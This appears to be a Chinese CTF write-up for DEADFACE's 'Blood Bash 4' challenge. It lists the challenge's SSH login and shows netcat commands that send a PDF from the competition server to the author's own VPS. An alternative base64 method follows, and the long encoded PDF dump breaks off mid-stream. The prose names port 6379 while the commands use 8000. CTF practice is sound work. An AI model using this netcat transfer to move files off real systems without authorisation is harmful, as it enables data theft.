<p><em>Username: <code>bl0ody_mary</code> Password: <code>d34df4c3</code></em></p>
<p><em>bloodbash.deadface.io:22</em></p>
<hr>
<p>测试后发现无法使用<code>curl</code>,只有<code>nc</code>可以使用.</p>
<p><code>nc</code>也可以用来传输文件,首先在自己的VPS上使用<code>nc</code>监听6379端口,准备接收文件</p>
<pre><code class="shell">root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf
</code></pre>
<p>在比赛的服务器上用<code>nc</code>发送文件</p>
<pre><code class="shell">bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\ Monne\ Customer\ Portal.pdf
</code></pre>
<p>下载pdf文件并打开,即可看到flag</p>
<p><img data-src="/../../CTF/DEADFACECTF/Forensics/images/Blood_Bash4.png" alt="Blood Bash 4"></p>
<h2 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h2><p>在比赛的服务器上使用<code>base64</code>命令将文件编码,复制后保存至本地文件<code>encoded</code></p>
<pre><code class="shell">~$ base64 De\ Monne\ Customer\ Portal.pdf
JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4
MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg
DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0
ZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy
RkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl
bmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd
Pj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt
DWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy
L0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi
YgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz
dHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh
Z2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw
IFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5
Mi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj
dDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08
PC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw
NjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq
DTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj
b2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl
Y3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL
CwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM
CgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn
LCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e
HiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA
AAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA
AAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ
SlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx
s7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH
cx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4
OTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi
o6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6
/9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT
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
RjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIX/2Q0K
ZW5kc3RyZWFtDWVuZG9iag0xIDAgb2JqDTw8L0ZpbHRlci9GbGF0ZURlY29kZS9GaXJzdCAxNC9M
ZW5ndGggMTI2L04gMy9UeXBlL09ialN0bT4+c3RyZWFtDQpo3jJTMFAwVzCxVLBQsDRSsLHRd84v
zStRMNR3yywqLgFKGSgE6fskwpkhlQWp+v6lJTmZeanFdnZADY5ArSCZgMSiVKBOM4iyzJKcVA2n
nMS8bIWAxPRUTbBSl2hDY7B0RGQUyF6gjXmlOTmx+sH67vkh+XZ2AAEGAKanJzYNCmVuZHN0cmVh
bQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh
Pj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr
YzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl
IFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg
Ij4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk
Zi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg
ICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg
ICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg
IHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg
ICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w
Ok1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg
ICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl
YXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w
NTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB
Y3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg
ICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN
TTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94
bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi
LTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg
PHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w
ZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4
bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
